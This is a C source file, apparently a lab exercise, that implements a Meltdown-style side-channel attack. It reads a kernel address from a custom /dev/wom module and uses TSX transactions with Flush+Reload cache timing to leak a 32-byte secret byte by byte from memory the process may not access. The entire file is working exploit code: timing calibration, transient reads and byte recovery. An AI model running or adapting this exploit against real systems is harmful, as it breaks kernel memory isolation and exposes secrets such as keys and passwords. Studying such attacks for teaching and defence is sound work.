#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <inttypes.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <x86intrin.h>
#include <time.h>
#include <assert.h>

#include "asm.h"

#define SECRET_LENGTH 32
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)
#define ROUNDS 5
#define CAL_SAMPLES 64
#define STRIDE 4096

static volatile unsigned char sink;

static inline uint64_t time_access(volatile unsigned char *p) {
    uint64_t t1 = rdtscp();
    sink = *p;
    uint64_t t2 = rdtscp();
    return t2 - t1;
}

static inline uint64_t hit_min(volatile unsigned char *p) {
    uint64_t m = UINT64_MAX;
    for (int i = 0; i < ROUNDS; i++) {
        sink = *p;
        lfence();
        cpuid();
        uint64_t dt = time_access(p);
        if (dt < m) m = dt;
    }
    return m;
}

static inline uint64_t miss_min(volatile unsigned char *p) {
    uint64_t m = UINT64_MAX;
    for (int i = 0; i < ROUNDS; i++) {
        clflush((void*)p);
        lfence();
        cpuid();
        uint64_t dt = time_access(p);
        if (dt < m) m = dt;
    }
    return m;
}

static int calibrate_threshold(unsigned char *p) {
    uint64_t hsum = 0, msum = 0;
    for (int i = 0; i < CAL_SAMPLES; i++) { hsum += hit_min(p); msum += miss_min(p); }
    uint64_t h = hsum / CAL_SAMPLES, m = msum / CAL_SAMPLES;
    return (int)((h + m) / 2);
}

void *wom_get_address(int fd) {
    void *addr = NULL;
    if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0) return NULL;
    return addr;
}

int main(int argc, char *argv[]) {

    char leaked_secret[SECRET_LENGTH + 1];
    memset(leaked_secret, 0, (SECRET_LENGTH+1) * sizeof(char));
    char *secret_addr;
    int fd;

    fd = open("/dev/wom", O_RDONLY);
    if (fd < 0) {
        perror("open");
        fprintf(stderr, "error: unable to open /dev/wom. Please build and load the wom kernel module.\n");
        return -1;
    }

    secret_addr = wom_get_address(fd);

    {
        int ITERATIONS = 200;
        int RELOADBUFFER_SIZE = 256 * STRIDE;
        unsigned char *reloadbuffer = (unsigned char*)malloc(RELOADBUFFER_SIZE);
        assert(reloadbuffer);
        for (int i = 0; i < 256; i++) reloadbuffer[i * STRIDE] = 1;
        int CACHE_THRESHOLD = calibrate_threshold(reloadbuffer + 128 * STRIDE);

        char tmp[SECRET_LENGTH];
        lseek(fd, 0, SEEK_SET);
        ssize_t r = read(fd, tmp, SECRET_LENGTH);
        (void)r;

        for (size_t idx = 0; idx < SECRET_LENGTH; idx++) {
            int counts[256] = {0};

            for (int it = 0; it < ITERATIONS; it++) {
                for (int i = 0; i < 256; i++) clflush(reloadbuffer + i * STRIDE);
                mfence(); cpuid();

                unsigned status = _xbegin();
                if (status == _XBEGIN_STARTED) {
                    unsigned char v = *(volatile unsigned char*)(secret_addr + idx);
                    sink = *(volatile unsigned char*)(reloadbuffer + ((unsigned)v) * STRIDE);
                    _xend();
                }

                for (int i = 0; i < 256; i++) {
                    uint64_t k = (i + 109883 * 256) & 255;
                    uint64_t dt = time_access(reloadbuffer + k * STRIDE);
                    if ((int)dt < CACHE_THRESHOLD) counts[k]++;
                }
            }

            int best = 0, bestc = -1;
            for (int v = 0; v < 256; v++) if (counts[v] > bestc) { bestc = counts[v]; best = v; }
            leaked_secret[idx] = (char)best;
        }

        free(reloadbuffer);
    }

    printf("Secret: %s\n", leaked_secret);

    close(fd);
    return 0;
}
